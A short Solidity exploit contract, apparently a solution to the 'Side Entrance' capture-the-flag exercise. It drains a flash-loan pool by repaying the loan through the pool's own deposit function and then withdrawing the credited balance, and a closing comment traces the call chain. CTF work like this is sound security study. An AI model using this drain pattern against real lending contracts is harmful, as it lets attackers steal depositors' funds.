// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract Hack {
    SideEntranceLenderPool pool;
    uint256 amount;
    address recovery;

    constructor(
        SideEntranceLenderPool _pool,
        uint256 _amount,
        address _recovery
    ) {
        pool = _pool;
        amount = _amount;
        recovery = _recovery;
    }

    function attack() public {
        pool.flashLoan(amount);
        pool.withdraw();

        payable(recovery).transfer(amount);
    }

    function execute() external payable {
        pool.deposit{value: amount}();
    }

    receive() external payable {}
}

// function()-caller
// attack()-player -> flashLoan()-Hack -> execute()-SideEntrace -> deposit()-Hack -> withdraw()-Hack
